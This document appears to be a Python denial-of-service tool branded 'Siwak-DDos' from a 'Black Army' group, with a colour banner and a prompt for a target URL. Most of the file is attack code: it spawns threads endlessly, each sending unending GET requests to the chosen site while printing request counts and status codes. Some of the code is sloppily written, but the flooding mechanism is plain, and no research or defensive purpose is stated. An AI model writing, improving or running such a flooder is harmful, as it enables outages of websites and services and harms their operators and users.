import colorama
import threading 
import aiohttp
import asyncio
import subprocess
import multiprocess
import sys
import time
from time import sleep
from pystyle import *
import os

#//Gui Start//#
 

headers = {
  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64"
}
osystem = sys.platform

if osystem == "linux":
  os.system("clear")
else:
  os.system("cls")
print("""
\033[32m 

[*] /s3cr3tmod-xp/Siwak-DDos

[✓] Black Army Comunnity

""")
time.sleep(2.5)


if osystem == "linux":
  os.system("clear")
else:
  os.system("cls")
  
time.sleep(1)
banner = r"""

        ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
        ▒▒╔══════════╗
        ▒▒║
        ▒▒╚═══════════╝

        """.replace('▒▒', '▒▒')


print(Colorate.Horizontal(Colors.green_to_red, banner))
#//Gui End//#
num = 0
reqs = []
loop = asyncio.new_event_loop()
r = 0
print("\033[38;5;111m┏━━━━━━━⬣")
url = input("\033[38;5;111m┗━⟩ Url-target: \033[37m")
print()
time.sleep(2)
if url.startswith("http") or url.startswith("https"):
  pass
else:
  url = "http://"+url

  print(url)
async def fetch(session, url):
    global r, reqs
    start = int(time.time())
    while True:
      async with session.get(url, headers=headers) as response:
        if response:
          set_end = int(time.time())
          set_final = start - set_end
          final = str(set_final).replace("-", "")
 
          if response.status == 200:
            r += 1
          reqs.append(response.status)
          time.sleep(2)
          print()
          sys.stdout.write(f"\033[38;5;39mRequests\033[37m: |{str(len(reqs))}| \033[38;5;39mtime\033[37m: |{final}| \033[38;5;37mResponse status Code \033[37m|{str(response.status)}|\r")
          print(f"\033[38;5;2mWeb target \033[33m" +str(url)+ "")
        else:
          print(Colorate.Horizontal(Colors.red_to_green, "[-] Server is not responding"))



urls = []
urls.append(url)

async def main():
  tasks = []
  async with aiohttp.ClientSession() as session:
    for url in urls:
      tasks.append(fetch(session, url))
    ddos = await asyncio.gather(*tasks)

def run():
    loop.run_forever(asyncio.run(main()))


if __name__ == '__main__':
  active = []
  ths = []
  while True:
    try:
      while True:
        th = threading.Thread(target=run)
        try:
          th.start()
          ths.append(th)
          sys.stdout.flush()
        except RuntimeError:
          pass
    except:
      pass

